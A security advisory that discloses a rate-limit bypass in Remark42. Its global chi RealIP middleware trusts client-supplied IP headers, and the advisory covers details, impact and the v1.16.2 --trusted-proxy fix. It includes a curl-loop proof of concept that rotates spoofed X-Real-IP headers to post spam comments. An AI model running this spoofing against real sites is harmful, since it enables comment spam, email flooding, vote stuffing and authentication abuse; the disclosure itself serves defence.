Remark42 applied chi's middleware.RealIP globally, trusting True-Client-IP / X-Real-IP / X-Forwarded-For headers without verifying the request came from a trusted proxy. The per-IP rate limiters key on the overwritten r.RemoteAddr, so any client can bypass every per-IP rate limiter by rotating spoofed IP headers. The same spoofed IP also drives other per-IP controls (stored comment IP, anonymous identity derivation, and --votes-ip vote de-duplication). This affects deployments reachable directly from the internet (Remark42's built-in HTTP, static TLS, and ACME modes are all documented and supported), as well as any proxied deployment where the proxy forwards an attacker-controlled recognised header.

Details

The router applies middleware.RealIP globally, ahead of the per-route limiters, without any check that the server is behind a trusted proxy (in v1.16.1, backend/app/rest/api/rest.go:207).

The rateLimiter function (v1.16.1, backend/app/rest/api/rest.go:769-779) builds a tollbooth limiter with IPLookup{Name: "RemoteAddr"}, which reads r.RemoteAddr. Since chi's middleware.RealIP (v1.16.1, backend/vendor/github.com/go-chi/chi/v5/middleware/realip.go:42-55) unconditionally overwrites r.RemoteAddr from True-Client-IP > X-Real-IP > first X-Forwarded-For (accepting any syntactically valid IP), any client can set its apparent IP to an arbitrary value.

This bypasses every per-IP rate limiter that runs after RealIP: /auth (2/s), avatars (100/s), the image proxy (10/s), open / protected / admin route groups (10/s), root routes (50/s), and /web/* (20/s). Comment and vote creation go through the update limiter, whose server default is UPDATE_LIMIT=0.5/s (burst 1), not 10/s. The global 1,000 concurrent-request throttle still applies, so this is a per-IP-limit bypass rather than truly unlimited throughput. chi's own documentation warns that middleware.RealIP should be used only behind a trusted proxy.

PoC

# Deploy Remark42 reachable directly from the internet (built-in HTTP / TLS / ACME, no proxy that overwrites the headers).
# Comment creation is limited to UPDATE_LIMIT (default 0.5/s, burst 1) per IP.

# Rotate X-Real-IP across many requests; each distinct value gets its own token bucket.
for i in $(seq 1 100); do
  curl -s -o /dev/null -w '%{http_code}\n' \
    -H "X-Real-IP: 192.0.2.$i" \
    -X POST 'https://remark42.example.com/api/v1/comment?site=site1' \
    -H 'Authorization: Bearer YOUR_JWT' \
    -H 'Content-Type: application/json' \
    -d '{"text":"spam","locator":{"site":"site1","url":"https://example.com/post"}}'
done | sort | uniq -c
# With rotating headers the responses stay 201; without them, requests beyond the burst return 429.

Impact

By rotating the spoofed client IP an attacker bypasses the per-IP token buckets on all rate-limited endpoints and defeats other per-IP controls, enabling: (a) spam comment creation beyond the configured per-IP limit, (b) confirmation-email / notification flooding to supplied addresses, (c) high-volume outbound image fetching and resource consumption via the image proxy (its transport still blocks private/reserved destinations and DNS rebinding, so this is amplification, not new SSRF reach), (d) authentication-endpoint abuse, (e) where --votes-ip is enabled, defeating per-IP vote de-duplication (ballot stuffing), and (f) minting fresh anonymous identities and poisoning the stored comment IP and request logs, since the anonymous user ID is derived from name + RemoteAddr. The global concurrency ceiling and per-request timeouts remain, so availability impact is limited.

Resolution

Mitigation support was added in v1.16.2 (umputun/remark42#2116, follow-up in #2118). Upgrading alone does not remediate the issue: --trusted-proxy must be configured.

The fix adds --trusted-proxy / TRUSTED_PROXY. When set, the forwarding headers (X-Real-IP, then CF-Connecting-IP, then the leftmost public X-Forwarded-For) are honoured only when the direct TCP peer falls inside a trusted-proxy network; for a request from any other peer those headers are dropped and the real socket IP is used. When it is unset, the previous trust-all behaviour is preserved for backward compatibility and a startup warning is logged, so an un-configured v1.16.2 remains exploitable. True-Client-IP is no longer recognised. TRUSTED_PROXY takes a comma-separated list; on the command line, repeat --trusted-proxy per entry.

Required configuration:

  • Reachable directly from the internet: set a value that no real client matches so the forwarding headers are always ignored, e.g. --trusted-proxy=127.0.0.1/32 (only when Remark42 is not actually reached over loopback).
  • Behind a reverse proxy: point --trusted-proxy at the proxy's network only, block direct access to Remark42, and make the proxy overwrite X-Real-IP with the real client and discard client-supplied forwarding headers. A proxy that merely appends to X-Forwarded-For, or that forwards a client-supplied X-Real-IP, still lets the client choose the reported IP. Note that the shipped nginx manual sets X-Real-IP but does not strip a client True-Client-IP.
  • Before v1.16.2: strip True-Client-IP, X-Real-IP, and X-Forwarded-For at the edge and set a known-safe client-IP header.

See the Trusted proxies and client IP docs.
